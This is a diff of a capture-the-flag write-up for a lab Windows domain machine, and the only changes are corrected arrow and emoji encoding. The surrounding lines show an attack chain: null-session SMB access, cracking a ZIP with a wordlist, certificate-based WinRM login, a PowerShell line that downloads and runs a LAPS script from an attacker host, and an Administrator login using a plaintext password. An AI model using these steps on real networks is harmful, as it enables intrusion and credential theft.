@@ -145,8 +145,8 @@ smbclient //10.10.11.152/Shares -N
 
 ![SMBClient Shares Null Session](screenshots/smbclient_shares_null.png)
 
-- **HelpDesk** â†’ Contains files referencing **LAPS** (Local Administrator Password Solution).
-- **Dev** â†’ Contains `winrm_backup.zip`.
+- **HelpDesk** → Contains files referencing **LAPS** (Local Administrator Password Solution).
+- **Dev** → Contains `winrm_backup.zip`.
 
 ---
 
@@ -172,7 +172,7 @@ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
 
 ![fcrackzip Output](screenshots/fcrackzip.png)
 
-Password recovered â†’ extract `.pfx` file.
+Password recovered → extract `.pfx` file.
 
 ---
 
@@ -236,7 +236,7 @@ evil-winrm -i 10.10.11.152 -c certificates.pem -k priv-key.pem -S
 
 ![User Flag](screenshots/user_flag.png)
 
-ðŸ **User flag obtained**
+🏁 **User flag obtained**
 
 ---
 
@@ -267,8 +267,8 @@ Notable accounts:
 
 Continue the attack chain with the next commands:
 
-- **svc_deploy** â†’ Member of `LAPS_Readers`
-- **TRX** â†’ Member of `Domain Admins`
+- **svc_deploy** → Member of `LAPS_Readers`
+- **TRX** → Member of `Domain Admins`
 
 ---
 
@@ -333,7 +333,7 @@ IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7/Get-LAPSPassword
 
 ![LAPS Script Execution](screenshots/LAPS_executed_in_legacyy_user.png)
 
-ðŸ’¡ **Note:** In a real engagement, `AdmPwd.PS` cmdlets like `Get-AdmPwdPassword` can be used instead:
+💡 **Note:** In a real engagement, `AdmPwd.PS` cmdlets like `Get-AdmPwdPassword` can be used instead:
 
 ``` powershell
 Find-AdmPwdExtendedRights -Identity 'Domain Controllers' Get-AdmPwdPassword -ComputerName DC01
@@ -353,23 +353,23 @@ evil-winrm -i 10.10.11.152 -u 'Administrator' -p 'iLZZ!2zt/)]s#@6+-#L@}Yc6' -S
 
 The `root.txt` flag is found under `TRX\Desktop`, accessible due to Domain Admin privileges.
 
-ðŸ **Root flag obtained**
+🏁 **Root flag obtained**
 
 ---
 
-# âœ… MACHINE COMPLETE
+# ✅ MACHINE COMPLETE
 
 ---
 
 ## Summary of Exploitation Path
 
-1. **SMB Enumeration** â†’ Discovered `winrm_backup.zip` in `Shares`.
-2. **ZIP Cracking** â†’ Extracted `.pfx` file.
-3. **PFX Cracking** â†’ Retrieved certificate and key.
-4. **WinRM over SSL** â†’ Logged in as `legacyy`.
-5. **Credential Harvesting** â†’ Found `svc_deploy` credentials in PowerShell history.
-6. **LAPS Abuse** â†’ Retrieved Domain Admin password.
-7. **Domain Admin Access** â†’ Retrieved root flag.    
+1. **SMB Enumeration** → Discovered `winrm_backup.zip` in `Shares`.
+2. **ZIP Cracking** → Extracted `.pfx` file.
+3. **PFX Cracking** → Retrieved certificate and key.
+4. **WinRM over SSL** → Logged in as `legacyy`.
+5. **Credential Harvesting** → Found `svc_deploy` credentials in PowerShell history.
+6. **LAPS Abuse** → Retrieved Domain Admin password.
+7. **Domain Admin Access** → Retrieved root flag.    
 
 ---
 
